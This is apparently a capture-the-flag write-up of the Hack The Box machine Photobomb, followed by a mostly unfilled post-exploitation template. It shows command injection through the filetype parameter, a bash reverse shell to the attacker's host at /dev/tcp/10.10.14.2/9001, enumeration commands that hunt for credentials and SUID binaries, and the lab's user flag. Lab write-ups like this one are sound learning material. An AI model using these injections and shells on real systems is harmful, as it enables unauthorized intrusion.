Tags: 
# **Nmap Results**

```text
Nmap scan report for 10.10.11.182
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
```
<br>
<br>

# **Service Enumeration**
The Nmap results tell us that there are 2 ports open, port 22 for **SSH** and port 80 for an **nginx** webserver. The default script scan discovers the hostname of the box, photobomb.htb, so we add this to our /etc/hosts file.  

Here's what we see when we access the page in our browser:
![[Pasted image 20241223204118.png]]
The link on the line telling you how to get started leads to a page `/printer`, which has **HTTP authentication** set up. We don't have any creds so we continue enumerating

Here's the page source:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```

We see 1 line of interest here, `<script src="photobomb.js"></script>`. Here's what we find in the source of that file:

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
This script was created because of tech supports inability to remember their creds to the `/printer` page. It first checks if the cookie `isPhotoBombTechSupport` exists and contains some value, and if so, it retrieves all elements by the class `creds` and modifies the first instance (the url) to include the username and password for HTTP authentication. 

Given this, we can now access the `/printer` page. Here's what we find:
![[Pasted image 20241223210527.png]]
We are given the option to print various photos. The page source doesn't show anything of interest, so we'll intercept and analyze the request made when clicking the download button with **burpsuite**. 

Here is the request we're sending:
```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: keep-alive
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```
We see 3 parameters, **photo, filetype, and dimensions**. My first instinct was to test for an **LFI** vulnerability in the photo parameter by typing a bunch of **"../"** characters and then **/etc/passwd**, but the response was **"Invalid photo"**. 

I then tested to see how the web server responded to unexpected input like invalid filetypes or special characters that don't belong. The latter caused the web server to respond differently when I inputted a semicolon in the filetype parameter. It returned:

`Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg`

This led me to believe that the **filetype** parameter had an **RCE** vulnerability. I tested it by passing `jpg; sleep 5`. The server did end up taking 5 seconds to respond, meaning we do have RCE on the machine.
<br>
<br>
# **Exploitation**
## **Initial Access**
Given the RCE vuln, I set up a listener with `nc -lvnp 9001` on my machine and passed a common reverse shell one liner in the filetype parameter like so: `jpg; bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'`. To be safe, I url encoded this and then sent the request. 
![[Pasted image 20241223233534.png]]
The listener caught the request made to my machine and I got a shell. We are logged in as **wizard**. 
<br>
<br>

## **Post-Exploit Enumeration**
### **Operating Environment**

> [!tldr]- Current User
> - `id` output:
> `uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)`
> - `sudo -l` output:
>	```
>	User wizard may run the following commands on photobomb:
  > 	 (root) SETENV: NOPASSWD: /opt/cleanup.sh
>	```
> 
<br>

### **Users and Groups**

> [!tldr]- Local Users
> Document here any interesting username(s) after running the below commands:
> - Windows
>     - `net user` or `Get-LocalUser` output
>     - `net user <username>` or `Get-LocalUser <username> | Select-Object *` to enumerate details about specific users
>     - Can you dump and pass/crack hashes from SAM using your current access?
> 
> - *nix
>     - `cat /etc/passwd` output

> [!tldr]- Local Groups
> Document here any interesting group(s) after running the below commands:
> - Windows
>     - `net localgroup` or `Get-LocalGroup` output
>     - `net localgroup <group_name>` or `Get-LocalGroupMember <group_name> | Select-Object *` to enumerate users of specific groups
>   
> - *nix
>     - `cat /etc/group` output
>     - `cat /etc/group | grep <username>` to check group memberships of specific users

<br>

### **Network Configurations**

> [!tldr]- Network Interfaces
> Document here any interesting / additional interfaces:
>   
> - Windows
>     - `ipconfig` or `Get-NetAdapter` output
>   
> - *nix
>     - `ip address` or `ifconfig` output

>[!tldr]- Open Ports
> Document here any ports listening on loopback or not available to the outside:
>   
> - Windows
>     - `netstat -ano | findstr /i listening` or `Get-NetTCPConnection -State Listen` output
>   
> - *nix
>     - `netstat -tanup | grep -i listen` or `ss -tanup | grep -i listen` output

<br>

### **Processes and Services**

> [!tldr]- Interesting Processes
>
> First...
> Enumerate processes:
>
> - Windows
>     - `tasklist`
>     - `Get-Process`
>     - `Get-CimInstance -ClassName Win32_Process | Select-Object Name, @{Name = 'Owner' ; Expression = {$owner = $_ | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue ; if ($owner.ReturnValue -eq 0) {$owner.Domain + '\' + $owner.User}}}, CommandLine | Sort-Object Owner | Format-List`
>
> - *nix
>     - `ps aux --sort user`
>
> Then...
> Document here:
>    - Any interesting processes run by users/administrators
>    - Any vulnerable applications
>    - Any intersting command line arguments visible

> [!tldr]- Interesting Services
>
> - Windows
>     - First...
>     Enumerate services:
>           - `sc.exe query`
>               - Then `sc.exe qc <service-name>`
>             - List the configuration for any interesting services
>           - `Get-CimInstance -ClassName Win32_Service | Select-Object Name, StartName, PathName | Sort-Object Name | Format-List`
>     - Then...
>       Check for things like:
>           - Vulnerable service versions
>         - Unquoted service path
>         - Service path permissions too open?
>           - Can you overwrite the service binary?
>           - DLL injection?
>
> - *nix
>     - First...
>       Enumerate services:
>         - `service --status-all` or `systemctl list-units --type=service --state=running`
>     - Then...
>     Check for things like:
>         - Vulnerable service versions
>         - Configuration files with passwords or other information
>         - Writable unit files
>             - One-liner to check for writable service unit files: `systemctl list-units --state=running --type=service | grep '\.service' | awk -v FS=' ' '{print $1}' | xargs -I % systemctl status % | grep 'Loaded:' | cut -d '(' -f 2 | cut -d ';' -f 1 | xargs -I % find % -writable 2>/dev/null`
>           - Writable service binaries
>
> Then...
> Document here:
>    - Any interesting services or vulnerabilities
>    - Any vulnerable service versions
>    - Any intersting configuration files

<br>

### **Scheduled Tasks**

> [!tldr]- Interesting Scheduled Tasks
>
> First...
> Enumerate scheduled tasks:
>
> - Windows
>     - `schtasks /QUERY /FO LIST /V | findstr /i /c:"taskname" /c:"run as user" /c:"task to run"`
>     - `Get-CimInstance -Namespace Root/Microsoft/Windows/TaskScheduler -ClassName MSFT_ScheduledTask | Select-Object TaskName, @{Name = 'User' ; Expression = {$_.Principal.UserId}}, @{Name = 'Action' ; Expression = {($_.Actions.Execute + ' ' + $_.Actions.Arguments)}} | Format-List`
> - *nix
>     - `crontab -l`
>     - `cat /etc/cron* 2>/dev/null`
>     - `cat /var/spool/cron/crontabs/* 2>/dev/null`
>
> Then...
> Document here:
>    - Any interesting scheduled tasks
>    - Any writable paths in the scheduled task
>    - Any intersting command line arguments visible

<br>

### **Interesting Files**

> [!tldr]- C:\InterestingDir\Interesting-File1.txt
>
>
> - Windows
>     - Check for writable files and directories
>         - See https://github.com/0xBEN/CTF-Scripts/blob/main/HackTheBox/Axlle/Find-FileAccess.ps1
>     - Check for configuration files with passwords and other interesting info
>     - Check for scripts with external dependencies that can be overwritten or changed
>     - Some interesting places to check
>       - Check `PATH` variable for current user for possible interesting locations
> 	      - CMD: `echo %PATH%`
> 	      - PowerShell: `$env:Path`
>       - Also check for hidden items
>       - PowerShell History File: `(Get-PSReadLineOption).HistorySavePath`
>       - I reference `%SYSTEMDRIVE%`, as `C:` is not always the system volume
>           - `%SYSTEMDRIVE%\interesting_folder`
>           - `%SYSTEMDRIVE%\Users\user_name`
>               - Desktop, Downloads, Documents, .ssh, etc
>               - AppData (may also have some interesting things in Local, Roaming)
>           - `%SYSTEMDRIVE%\Windows\System32\drivers\etc\hosts`
>           - `%SYSTEMDRIVE%\inetpub`
>           - `%SYSTEMDRIVE%\Program Files\program_name`
>           - `%SYSTEMDRIVE%\Program Files (x86)\program_name`
>           - `%SYSTEMDRIVE%\ProgramData`
>           - `%SYSTEMDRIVE%\Temp`
>           - `%SYSTEMDRIVE%\Windows\Temp`
>       - Check the Registry for passwords, configurations, interesting text
>           - `HKEY_LOCAL_MACHINE` or `HKLM`
>           - `HKEY_CURRENT_USER` or `HKCU`
>           - Search the `HKLM` hive recursively for the word `password`
>               - `reg query HKLM /f password /t REG_SZ /s`
>
> - *nix
>     - Check for SUID binaries
>         - `find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null`
>     - Check for interesting / writable scripts, writable directories or files
>         - `find /etc -writable -exec ls -l {} \; 2>/dev/null`
>         - `find / -type f \( -user $(whoami) -o -group $(whoami) \) -exec ls -l {} \; 2>/dev/null
>     - Check for configuration files with passwords and other interesting info
>     - Check for scripts with external dependencies that can be overwritten or changed
>     - Use strings on interesting binaries to check for relative binary names and $PATH hijacking
>     - Some interesting places to check (check for hidden items)
>       - Check `PATH` variable for current user for possible interesting locations: `echo $PATH`
>       - `/interesting_folder`
>       - `/home/user_name`
>         - `.profile`
>         - `.bashrc`, `.zshrc`
>         - `.bash_history`, `.zsh_history`
>         - Desktop, Downloads, Documents, .ssh, etc.
>         - PowerShell History File: `(Get-PSReadLineOption).HistorySavePath`
>       - `/var/www/interesting_folder`
>       - `/var/mail/user_name`
>       - `/opt/interesting_folder`
>       - `/usr/local/interesting_folder`
>       - `/usr/local/bin/interesting_folder`
>       - `/usr/local/share/interesting_folder`
>       - `/etc/hosts`
>       - `/tmp`
>       - `/mnt`
>       - `/media`
>       - `/etc`
>         - Look for interesting service folders
>         - Check for readable and/or writable configuration files
>         - May find cleartext passwords

<br>
<br>

# **Privilege Escalation**  

Document here:
* Exploit used (link to exploit)
* Explain how the exploit works 
* Any modified code (and why you modified it)
* Proof of privilege escalation (screenshot showing ip address and privileged username)

<br>
<br>



# Skills Learned

- Given testable web parameters, don't immediately assume LFI. **Fuzz them using tools like wfuzz or ffuf and see if the web server behaves differently or returns something unexpected**
<br>
<br>

# **Flags**

> [!tldr]- User
> 
> `81baa911e24520eb4af2cae91daaa46a`

> [!tldr]- Root
> 
> `flag goes here`
